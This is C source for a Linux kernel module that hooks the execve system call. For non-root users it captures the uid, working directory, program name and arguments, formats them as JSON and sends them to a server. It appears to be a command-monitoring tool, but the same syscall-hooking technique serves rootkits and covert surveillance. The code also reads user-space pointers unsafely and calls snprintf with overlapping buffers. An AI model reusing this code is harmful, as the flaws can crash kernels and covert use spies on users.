/* execve_hook.c - Syscall hook for execve()
 * Written by Brett Broadhurst <brettbroadhurst@gmail.com>
 */

#include <linux/module.h>
#include <linux/cred.h>
#include <linux/fs_struct.h>

#include "registered_hooks.h"
#include "syscall_hook.h"

#ifdef PTREGS_SYSCALL_STUBS
#define X_LEN 256

/* Current process data of the user. */
struct user_data {
    kuid_t unix_id;
    char buffer[X_LEN];
    char *cwd_path;
};

/* Get current process info */
static inline void get_current_user_data(struct user_data *data) {
    struct path pwd;

    /* Get the current working directory from the file system. */
    get_fs_pwd(current->fs, &pwd);

    /* Set the user_data struct. */
    data->unix_id = current_uid(); /* linux/cred.h */
    data->cwd_path = dentry_path_raw(pwd.dentry, data->buffer, X_LEN); /* linux/fs_struct.h */
}

/* Fill the JSON buffer with formatted JSON data from the current execution state. */
static inline void set_json_buffer(
        char *json_buffer,
        size_t json_buffer_size,
        int uid,
        char *cwd,
        char *filename,
        char **argv)
{
    char **p_argv = (char **)argv; /* tmp pointer */

    /* Copy uid and filename to the json_buffer */
    snprintf(json_buffer, json_buffer_size,
            "{\"uid\":%d,\"cwd\":\"%s\",\"filename\":\"%s\",\"command\":\"",
            uid, cwd, filename);

    /* Copy all execve argv elements to the JSON buffer. */
    p_argv = (char **)argv;
    while (*p_argv != NULL) {
        snprintf(json_buffer, json_buffer_size, "%s%s ", json_buffer, *p_argv);
        (char **)p_argv++;
    }

    /* Close off the JSON buffer. */
    snprintf(json_buffer, json_buffer_size, "%s\"}\n", json_buffer);
}

/* execve system call hook via ptregs. */
asmlinkage int execve_hook(const struct pt_regs *regs)
{
#define JSON_SIZE DEFAULT_BUFFER_SIZE
    /* System call arguments */
    ptregs_syscall_hook_t sys_execve;         /* Original syscall      */
    char __user *filename = (char *)regs->di; /* first arg of syscall  */
    char __user **argv = (char **)regs->si;   /* second arg of syscall */
    struct user_data c_user_data;             /* current user data     */
    char *json_buffer = NULL;                 /* json buffer to send   */
    size_t json_buffer_size = JSON_SIZE;      /* json buffer size      */

    /* Original system call */
    sys_execve = (ptregs_syscall_hook_t)syscall_hook_get_original(__syscall_hook, __NR_execve);

    /* User data */
    get_current_user_data(&c_user_data);

    /* Filter logging to human users and not root. */
    if (c_user_data.unix_id.val == 0) {
        return sys_execve(regs);
    }

    /* Allocate memory for JSON buffer. */
    json_buffer = vmalloc(json_buffer_size);
    if (json_buffer == NULL) {
        printk(KERN_EMERG "watcher: could not allocate memory for execve string!\n");
        return sys_execve(regs); 
    }

    /* Clear the json buffer. */
    memset(json_buffer, 0, json_buffer_size);

    /* Set the JSON buffer to be sent. */
    set_json_buffer(json_buffer, json_buffer_size,
            c_user_data.unix_id.val, c_user_data.cwd_path,
            filename, argv);

    /* Send off the JSON buffer. */
    server_send(json_buffer, json_buffer_size);

    /* Free the JSON buffer. */
    vfree(json_buffer);
    return sys_execve(regs); 
}

#else

/* execve system call hook for older kernels. */
asmlinkage int execve_hook(const struct pt_regs *regs)
{
    ptregs_syscall_hook_t sys_execve;
    sys_execve = (ptregs_syscall_hook_t)syscall_hook_get_original(__syscall_hook, __NR_execve);
    return sys_execve(regs); 
}
#endif
